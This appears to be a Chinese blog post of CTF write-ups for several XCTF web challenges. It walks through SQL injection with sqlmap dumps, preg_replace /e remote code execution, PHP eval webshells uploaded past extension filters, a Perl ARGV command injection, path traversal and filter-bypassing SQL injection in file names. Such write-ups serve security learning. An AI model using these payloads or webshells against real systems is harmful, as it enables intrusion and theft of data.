参考：[攻防世界writeup——Web（持续更新）](https://blog.csdn.net/qq_42181428/article/details/89345094)
## ics-04
题目描述：工控云管理系统新添加的登录和注册页面存在漏洞，请找出flag
尝试admin发现失败，在找回密码处发现可以sql注入
`admin' or 1=1#`
![](https://img-blog.csdnimg.cn/20200328105402226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
`-1' union select 1,2,3,4#`
![](https://img-blog.csdnimg.cn/20200328110221851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
注入点是3，查询数据库发现没有回显，那么就用sqlmap跑一下
`python2 sqlmap.py -u "http://111.198.29.45:48163/findpwd.php" --data="username=1" --dbs`
![](https://img-blog.csdnimg.cn/20200328110827357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
最终得到账号和密码：
`python2 sqlmap.py -u "http://111.198.29.45:48163/findpwd.php" --data="username=1" -D cetc004 -T user -C "username,password" --dump`
![](https://img-blog.csdnimg.cn/20200328111247478.png)
那么就去重新注册一个c3tlwDmIn23账号，登录即可
![](https://img-blog.csdnimg.cn/20200328111615856.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
## ics-05
题目描述：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统
发现只有设备维护中心可进，查看源代码得：
![](https://img-blog.csdnimg.cn/20200329102127990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
发现是一个文件包含漏洞，伪协议读取源码，得到关键信息
`?page=php://filter/read=convert.base64-encode/resource=index.php`
```php
<?php
//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试

if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {

    echo "<br >Welcome My Admin ! <br >";

    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];

    if (isset($pattern) && isset($replacement) && isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }else{
        die();
    }

}
?>
```
![](https://img-blog.csdnimg.cn/20200329103008124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
函数preg_replace() 的漏洞：**当pre_replace的参数pattern输入/e的时候 ,参数replacement的代码当作PHP代码执行**
那么修改XFF头，并在index.php输入：
`?pat=/1/e&rep=system("ls /");&sub=1`
![](https://img-blog.csdnimg.cn/20200329103715998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
接下来找flag
`?pat=/1/e&rep=system("find -name flag");&sub=1`
![](https://img-blog.csdnimg.cn/20200329103941509.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
`?pat=/1/e&rep=system("ls ./s3chahahaDir/flag");&sub=1`
![](https://img-blog.csdnimg.cn/20200329104212519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
最后`?pat=/1/e&rep=show_source("./s3chahahaDir/flag/flag.php");&sub=1`直接获取源码或者
`?pat=/1/e&rep=system("cat ./s3chahahaDir/flag/flag.php");&sub=1`，并查看源码得到flag
![](https://img-blog.csdnimg.cn/20200329104333170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
## bug
一开始以为是二次注入，结果返回wrong，那么只能注册账号看看
![](https://img-blog.csdnimg.cn/20200329105505586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
在修改密码处抓包，将username改为admin，成功将admin密码修改，登录
![](https://img-blog.csdnimg.cn/20200329105628749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
修改XFF头为127.0.0.1，进入message，查看源码得到提示
![](https://img-blog.csdnimg.cn/20200329105825166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
看了wp才发现原来是文件上传`?module=filemanage&do=upload`
![](https://img-blog.csdnimg.cn/20200329110103211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
有检测<?php，改为`<script language="php">@eval($_POST['pass']);</script>`
并上传的后缀为php5，成功得到flag
![](https://img-blog.csdnimg.cn/20200329110633256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
## ics-07
题目描述：工控云管理系统项目管理页面解析漏洞
![](https://img-blog.csdnimg.cn/20200329154645387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
点击view-source得到源码

```php
 <?php
    session_start();

    if (!isset($_GET[page])) {
      show_source(__FILE__);
      die();
    }

    if (isset($_GET[page]) && $_GET[page] != 'index.php') {
      include('flag.php');
    }else {
      header('Location: ?page=flag.php');
    }
    ?>
```
```php
<?php
     if ($_SESSION['admin']) {
       $con = $_POST['con'];
       $file = $_POST['file'];
       $filename = "backup/".$file;

       if(preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)){
          die("Bad file extension");
       }else{
            chdir('uploaded');
           $f = fopen($filename, 'w');
           fwrite($f, $con);
           fclose($f);
       }
     }
     ?>

    <?php
      if (isset($_GET[id]) && floatval($_GET[id]) !== '1' && substr($_GET[id], -1) === '9') {
        include 'config.php';
        $id = mysql_real_escape_string($_GET[id]);
        $sql="select * from cetc007.user where id='$id'";
        $result = mysql_query($sql);
        $result = mysql_fetch_object($result);
      } else {
        $result = False;
        die();
      }

      if(!$result)die("<br >something wae wrong ! <br>");
      if($result){
        echo "id: ".$result->id."</br>";
        echo "name:".$result->user."</br>";
        $_SESSION['admin'] = True;
      }
     ?>
```
看了师傅的文章，首先传入的id浮点值不能为1，而且最后一位要为9，可构造`id=1a9`
![](https://img-blog.csdnimg.cn/20200330140258600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
然后就要文件上传，但正则过滤了后缀，并用chdir改变目录为uploaded，由于正则判断的是`.`后面的字符，用`/.`在文件名目录下在加个空目录，相当于没加，但绕过了正则。题目的上传路径为：/uploaded/backup/
POST提交`file=a.php/.&con=<?php @eval($_POST['pass']);?>`
![](https://img-blog.csdnimg.cn/20200330141847781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
最后蚁剑连接即可
![](https://img-blog.csdnimg.cn/20200330142937476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
这里上传路径还是有点懵，不是应该为uploaded了吗。。。。。
参考：
[攻防世界 web 进阶 ics-07](https://blog.csdn.net/weixin_42499640/article/details/99205257)
[XCTF的ics-07](https://blog.csdn.net/qq_45552960/article/details/102777514)


## i-got-id-200
发现是perl的内容，看了wp，师傅猜测的后台逻辑:
```php
use strict;
use warnings; 
use CGI;
my $cgi= CGI->new;
if ( $cgi->upload( 'file' ) ) { 
	my $file= $cgi->param( 'file' );
	 while ( <$file> ) { print "$_"; }
} 
```
在文件上传处会把上传的文件的内容在下方输出，猜测后台应该用了param()函数，如果传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来，达到读取任意文件的目的
猜测存在/flag
![](https://img-blog.csdnimg.cn/20200330145249673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
正常来说：根据网址猜测file.pl位于/var/www/cgi-bin/目录下
![](https://img-blog.csdnimg.cn/20200330145757228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
执行命令`?/bin/bash%20-c%20ls${IFS}/|`，%20为空格，可换成+号
![](https://img-blog.csdnimg.cn/20200330150246555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
最后获取flag`?/bin/bash%20-c%20cat${IFS}/flag|`
![](https://img-blog.csdnimg.cn/20200330150400451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

参考：[[wp] 攻防世界-i-got-id-200](https://blog.csdn.net/qq_40884727/article/details/100679503)
[xctf-i-got-id-200(perl网页文件+ARGV上传造成任意文件读取)](https://www.cnblogs.com/-chenxs/p/11953933.html)

## wtf.sh-150
没思路，看wp。~~wtf没见过，就照着wp写了~~
### 第一段flag
在展示文章的页面 post.wtf 下发现路径穿越漏洞，获得了网站源码，查找flag得到：
![](https://img-blog.csdnimg.cn/20200330153802490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
```php
<html>
<head>
    <link rel="stylesheet" type="text/css" href="/css/std.css" >
</head>
$ if contains 'user' ${!URL_PARAMS[@]} && file_exists "users/${URL_PARAMS['user']}"
$ then
$   local username=$(head -n 1 users/${URL_PARAMS['user']});
$   echo "<h3>${username}'s posts:</h3>";
$   echo "<ol>";
$   get_users_posts "${username}" | while read -r post; do
$       post_slug=$(awk -F/ '{print $2 "#" $3}' <<< "${post}");
$       echo "<li><a href=\"/post.wtf?post=${post_slug}\">$(nth_line 2 "${post}" | htmlentities)</a></li>";
$   done 
$   echo "</ol>";
$   if is_logged_in && [[ "${COOKIES['USERNAME']}" = 'admin' ]] && [[ ${username} = 'admin' ]]
$   then
$       get_flag1
$   fi
$ fi
</html>
```
当使用admin登录即可获取flag1，经发现有users目录，获取到了admin的cookie
![](https://img-blog.csdnimg.cn/20200330152258129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
那么使用admin的cookie登录即可得到一半的flag
![](https://img-blog.csdnimg.cn/20200330154019677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
### 第二段flag
在评论功能处如果用户名是一段可执行代码，而且写入的文件是 wtf 格式的，那么这个文件就能够执行我们想要的代码
注册用户：`${find,/,-iname,get_flag2} `
![](https://img-blog.csdnimg.cn/20200330155917161.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

**%09是水平制表符，必须添加，不然后台会把我们的后门当做目录去解析**

![](https://img-blog.csdnimg.cn/20200330160257680.png)
最后获取内容，注册用户：`$/usr/bin/get_flag2`
![](https://img-blog.csdnimg.cn/20200330160528631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
![](https://img-blog.csdnimg.cn/20200330160614210.png)

参考：[攻防世界WEB进阶之wtf.sh-150](https://blog.csdn.net/harry_c/article/details/100748217)
[记录一道神仙CTF-wtf.sh-150](https://www.cnblogs.com/wangtanzhi/p/11214333.html)

## upload
尝试上传各种文件，发现只有jpg上传成功，查看wp发现是注入？？？？？？
由于有过滤，使用利用selselectect和frfromom双写绕过。
`s'+(selselectect CONV(substr(hex(database()),1,12),16,10))+'.jpg`
**这里用到了CONV,substr,hex：**
不转成数字，完全没有回显结果，所以用hex先将字符转换成16进制，然后用CONV函数将16进制转化为10进制，依次获取子串的12位，用substr截取12是因为一旦过长，会用科学计数法表示。
`s'+(selselectect CONV(substr(hex(dAtaBase()),13,12),16,10))+'.jpg`得到后半段
![](https://img-blog.csdnimg.cn/20200330165021238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
再转换为16进制得到web_upload
```sql
s'+(seleselectct+CONV(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='web_upload' limit 1,1)),1,12),16,10))+'.jpg
s'+(seleselectct+CONV(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='web_upload' limit 1,1)),13,12),16,10))+'.jpg
s'+(seleselectct+CONV(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='web_upload' limit 1,1)),25,12),16,10))+'.jpg
得到hello_flag_is_here
s '+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = 'hello_flag_is_here' limit 0,1)),1,12),16,10))+'.jpg
得到i_am_flag
s '+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+'.jpg
得到!!_@m_Th.e_F!lag
```
这题比较难想，还有将字符转换为数字很巧妙，实属劝退。。。。
参考：
[攻防世界进阶upload](https://blog.csdn.net/Yu_csdnstory/article/details/94750179)
[攻防世界 upload](https://www.cnblogs.com/sharpff/p/10728498.html)